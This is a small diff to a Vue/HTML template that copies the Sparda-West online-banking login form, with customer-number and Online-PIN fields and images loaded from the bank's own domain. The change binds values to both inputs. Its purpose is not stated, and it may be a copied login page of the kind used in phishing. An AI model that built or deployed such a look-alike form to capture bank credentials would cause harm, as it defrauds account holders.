@@ -5,14 +5,14 @@
             <div class="textField">
                 <label for="user">Kundennummer</label>
             </div>
-            <input ref="inputUser" type="text" id="inputUser" autocomplete="off" maxlength="10" tabindex="1" title="Kundennummer (erforderlich)">
+            <input :value="input0" ref="inputUser" type="text" id="inputUser" autocomplete="off" maxlength="10" tabindex="1" title="Kundennummer (erforderlich)">
             <img src="https://banking.sparda-west.de/portalstatic/spm/gfx/style/zifferneingabe.png">
         </div>
         <div class="input pin">
             <div class="textField">
                 <label for="onlinePin">Online-Pin</label>
             </div>
-            <input ref="inputPin" type="password" id="inputOnlinePin" autocomplete="off" maxlength="6" tabindex="2" title="Online-PIN (erforderlich)">
+            <input :value="input1" ref="inputPin" type="password" id="inputOnlinePin" autocomplete="off" maxlength="6" tabindex="2" title="Online-PIN (erforderlich)">
             <img src="https://banking.sparda-west.de/portalstatic/spm/gfx/style/zifferneingabe.png">
         </div>
     </div>
